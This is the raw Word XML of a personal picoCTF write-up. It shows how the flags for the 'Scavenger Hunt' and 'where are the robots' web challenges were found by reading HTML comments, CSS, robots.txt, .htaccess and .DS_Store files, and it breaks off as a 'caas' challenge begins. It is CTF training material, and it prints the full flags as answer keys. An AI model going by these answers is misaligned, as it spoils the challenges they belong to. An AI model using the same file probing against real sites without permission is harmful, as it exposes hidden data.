    <w:p w14:paraId="3A7B12A8" w14:textId="77777777" w:rsidR="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="008B4AB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Scavenger Hunt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E877FF0"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 | 50 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F43E9E9" w14:textId="77777777" w:rsidR="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="008B4AB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B7173AC" w14:textId="77777777" w:rsidR="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="008B4AB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4A6F7A21" w14:textId="77777777" w:rsidR="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="008B4AB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1AD2C84" w14:textId="77777777" w:rsidR="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="008B4AB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some interesting information hidden around this site </w:t>
      </w:r>
      <w:hyperlink r:id="rId73" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:44070/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>. Can you find it?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4739CDA5" w14:textId="77777777" w:rsidR="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3BBB283B" w14:textId="0954A539" w:rsidR="002C0966" w:rsidRDefault="002C0966" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14404989" w14:textId="302E8BE4" w:rsidR="002C0966" w:rsidRDefault="002C0966" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="236E25"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="236E25"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve">&lt;!-- Here's the first part of the flag: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="008B4ABA">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="236E25"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="008B4ABA">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="236E25"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>{t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="236E25"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0529310B" w14:textId="3E515361" w:rsidR="002C0966" w:rsidRDefault="002C0966" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="236E25"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>css</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3B28E174" w14:textId="6A7E115D" w:rsidR="002C0966" w:rsidRDefault="002C0966" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002C0966">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>/* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2</w:t>
      </w:r>
      <w:bookmarkStart w:id="48" w:name="_Hlk112457559"/>
      <w:r w:rsidRPr="002C0966">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">: h4ts_4_l0 </w:t>
      </w:r>
      <w:bookmarkEnd w:id="48"/>
      <w:r w:rsidRPr="002C0966">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>*/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="016D1127" w14:textId="0534BDCC" w:rsidR="006F3074" w:rsidRDefault="006F3074" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>js</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="698A5DDD" w14:textId="78A3D5C3" w:rsidR="006F3074" w:rsidRDefault="006F3074" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006F3074">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>/* How can I keep Google from indexing my website? */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="404C854A" w14:textId="52A22DA4" w:rsidR="00E217C1" w:rsidRDefault="00E217C1" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32BDCA8A" w14:textId="1C9EA131" w:rsidR="00E217C1" w:rsidRDefault="00E217C1" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="292929"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>• Okay HOW??? Well, I did a bit of googling over here, according to google I read that you can use robots.txt file to manage crawler traffic to the site and also to keep a file off Google but it depends on the file type.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64373546" w14:textId="383BD5AF" w:rsidR="008B4ABA" w:rsidRDefault="00000000" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId74" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="008B4ABA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:44070/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="008B4ABA">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>robots.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F68818" w14:textId="77777777" w:rsidR="008B4ABA" w:rsidRPr="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="008B4ABA">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008B4ABA">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>User-agent: *</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63CFD8FB" w14:textId="77777777" w:rsidR="008B4ABA" w:rsidRPr="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="008B4ABA">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008B4ABA">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Disallow: /index.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37C41456" w14:textId="77777777" w:rsidR="008B4ABA" w:rsidRPr="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="008B4ABA">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008B4ABA">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t># Part 3: t_0f_pl4c</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F2555B" w14:textId="48BDB194" w:rsidR="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="008B4ABA">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008B4ABA">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"># I think this is an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008B4ABA">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>apache</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008B4ABA">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> server... can you Access the next flag?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E0E584" w14:textId="77777777" w:rsidR="00E217C1" w:rsidRDefault="00E217C1" w:rsidP="00E217C1">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="1B1B1B"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="Times New Roman" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="FFFFFF"/>
        </w:rPr>
        <w:t>Apache Configuration: .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="FFFFFF"/>
        </w:rPr>
        <w:t>htaccess</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="23D1DD70" w14:textId="77777777" w:rsidR="00E217C1" w:rsidRDefault="00E217C1" w:rsidP="00E217C1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="1B1B1B"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="FFFFFF"/>
        </w:rPr>
        <w:t>Apache .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="FFFFFF"/>
        </w:rPr>
        <w:t>htaccess</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> files allow users to configure directories of the web server they control without modifying the main configuration file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10708A7D" w14:textId="77777777" w:rsidR="00E217C1" w:rsidRDefault="00E217C1" w:rsidP="00E217C1">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="16FDA5AE" w14:textId="77777777" w:rsidR="00E217C1" w:rsidRDefault="00E217C1" w:rsidP="00E217C1">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BC9B8AA" w14:textId="206FD783" w:rsidR="00E217C1" w:rsidRDefault="00000000" w:rsidP="00E217C1">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId75" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="00E217C1">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:44070/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00E217C1">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E217C1">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>htaccess</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2FAD9BD8" w14:textId="487DA3B1" w:rsidR="00E217C1" w:rsidRPr="00E217C1" w:rsidRDefault="00E217C1" w:rsidP="00E217C1">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E217C1">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"># Part 4: </w:t>
      </w:r>
      <w:bookmarkStart w:id="49" w:name="_Hlk112457957"/>
      <w:r w:rsidRPr="00E217C1">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>3s_2_lO0k</w:t>
      </w:r>
      <w:bookmarkEnd w:id="49"/>
    </w:p>
    <w:p w14:paraId="3052538F" w14:textId="32407C4B" w:rsidR="00E217C1" w:rsidRDefault="00E217C1" w:rsidP="00E217C1">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E217C1">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t># I love making websites on my Mac, I can Store a lot of information there.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DBA9F1B" w14:textId="6C8F6867" w:rsidR="00E217C1" w:rsidRDefault="005047B5" w:rsidP="008B4ABA">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005047B5">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>What stands out the most about that hint is the capitalized "Store". In Macs, a .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005047B5">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>DS_Store</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005047B5">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> file stores the configurations for how the desktop looks (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005047B5">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>eg.</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005047B5">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> icon location, etc.) Changing .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005047B5">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>htacess</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005047B5">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> with .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005047B5">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>DS_Store</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005047B5">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> got</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FA9F713" w14:textId="43ED4AE6" w:rsidR="00E217C1" w:rsidRDefault="005047B5" w:rsidP="008B4ABA">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005047B5">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Congrats! You completed the scavenger hunt. Part 5: _7a46d25d}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02D79E22" w14:textId="36708B64" w:rsidR="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="008B4ABA">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008B4ABA">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008B4ABA">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{t</w:t>
      </w:r>
      <w:r w:rsidRPr="002C0966">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>h4ts_4_l0</w:t>
      </w:r>
      <w:r w:rsidRPr="008B4ABA">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>t_0f_pl4c</w:t>
      </w:r>
      <w:r w:rsidR="00E217C1" w:rsidRPr="00E217C1">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>3s_2_lO0k</w:t>
      </w:r>
      <w:r w:rsidR="005047B5" w:rsidRPr="005047B5">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>_7a46d25d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14DD28D4" w14:textId="77777777" w:rsidR="00C07BA2" w:rsidRDefault="00C07BA2" w:rsidP="00C07BA2">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="178B0DAF" w14:textId="77777777" w:rsidR="00C07BA2" w:rsidRDefault="00C07BA2" w:rsidP="00C07BA2">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20A86B18" w14:textId="77777777" w:rsidR="00961C9B" w:rsidRDefault="00961C9B" w:rsidP="00961C9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where are the robots</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78212DE4"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2BEA6A2F" w14:textId="77777777" w:rsidR="00961C9B" w:rsidRDefault="00961C9B" w:rsidP="00961C9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AF84558" w14:textId="77777777" w:rsidR="00961C9B" w:rsidRDefault="00961C9B" w:rsidP="00961C9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ZARATEC/DANNY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01892A9F" w14:textId="77777777" w:rsidR="00961C9B" w:rsidRDefault="00961C9B" w:rsidP="00961C9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634CD96" w14:textId="2A289DF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Can you find the robots? </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>https://jupiter.challenges.picoctf.org/problem/36474/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> (</w:t>
      </w:r>
      <w:hyperlink r:id="rId7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77" w:history="1">
        <w:r w:rsidRPr="001B2A6B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://jupiter.challenges.picoctf.org:36474</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="73403270" w14:textId="0E1039D1"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/robots.txt </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F86AD84" w14:textId="2833233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Return an error with a  html /477ce.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="067D3952" w14:textId="582D1B73"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5582E6DD" wp14:editId="19DF8F31">
            <wp:extent cx="5281118" cy="150127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8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5281118" cy="1501270"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="07AD9438" w14:textId="72C97B5D"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p>
    <w:p w14:paraId="368E98D8" w14:textId="4A42A79F" w:rsidR="00961C9B" w:rsidRDefault="00961C9B" w:rsidP="00961C9B">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7A254B1C" wp14:editId="03BF74E6">
            <wp:extent cx="5380186" cy="16384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0186" cy="1638442"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="614EE858" w14:textId="51666065" w:rsidR="008B4ABA" w:rsidRDefault="00961C9B" w:rsidP="00961C9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:hAnsi="Roboto"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:shd w:val="clear" w:color="auto" w:fill="000000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Guess you found the robots</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:hAnsi="Roboto"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{ca1cu1at1ng_Mach1n3s_477ce}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F8CD5C9" w14:textId="38F26AB8" w:rsidR="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00961C9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46F4E17F" w14:textId="3B7B9802" w:rsidR="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00961C9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7082D17C" w14:textId="7D1E6CCC" w:rsidR="00B335C0" w:rsidRDefault="00E45D20" w:rsidP="00B335C0">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C</w:t>
      </w:r>
      <w:r w:rsidR="00B335C0">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t>aas</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>HARD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65AB77AF" w14:textId="6E371D21"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 | 150 points</w:t>
      </w:r>
      <w:r w:rsidR="00E45D20">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="212121"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E1B554E" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C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redpwnWeb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="212121"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A47E47" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C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BROWNIEINMOTION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="368D6E31" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C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AC92624" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">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Now presenting </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK "https://caas.mars.picoctf.net/" \t "_blank" </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="5969F6"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>cowsay</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
